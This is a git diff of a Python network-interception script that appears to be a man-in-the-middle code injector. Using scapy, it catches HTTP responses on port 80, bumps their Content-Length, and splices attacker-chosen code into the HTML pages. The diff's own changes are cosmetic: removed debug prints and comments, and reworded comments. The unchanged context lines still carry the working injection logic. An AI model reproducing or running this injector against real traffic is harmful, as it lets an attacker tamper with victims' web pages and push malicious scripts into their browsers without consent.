@@ -33,7 +33,6 @@ def process_packet(packet):
     scapy_packet = scapy.IP(packet.get_payload())
     if scapy_packet.haslayer(scapy.Raw):  # DNS response
         try:
-            # print("------Packet---------")
             load = scapy_packet[scapy.Raw].load.decode()
             if scapy_packet[scapy.TCP].dport == 80:
                 if (url_target in load) if url_target else True:
@@ -47,13 +46,9 @@ def process_packet(packet):
                     content_length = re.search("(?:Content-Length:\s)(\d*)", load)
                     if content_length and "text/html" in load:
                         content_length = content_length.group(1)
-                        print(content_length)
                         new_cont_len = int(content_length) + len(code_inject)
                         load = load.replace(content_length, str(new_cont_len))
                     if not url_target:
-                        # How there are different packets coming, it is necessary to encode() and decode()
-                        # on every packet. Yet, the packet to encode() won't be the same as the packet to
-                        # decode().
                         load = inject_code(load, code_inject, inject_in)  # Injecting the code
                 elif scapy_packet[scapy.TCP].ack in ack_list_response:
                         load = inject_code(load, code_inject, inject_in)  # Injecting the code
@@ -61,9 +56,9 @@ def process_packet(packet):
                 packet.set_payload(bytes(set_load(scapy_packet, load)))
         except (UnicodeDecodeError, IndexError) as ie:
             # IndexError is when it is called TCP, although the first calls doesn't have that parameters
-            # so, the code just jump to accept the packets without any required manage.
+            # so, the code just jump to accept the packets without any required management.
             # UnicodeDecodeError is risen when the code tries to convert binary to string
-            # using decode() function.
+            # using decode() function. Thera ara some characters which decode() is not able to transform.
             # UnicodeDecodeError happens with some packets, those packets which no need though.
             # logging.exception(ie)
             pass
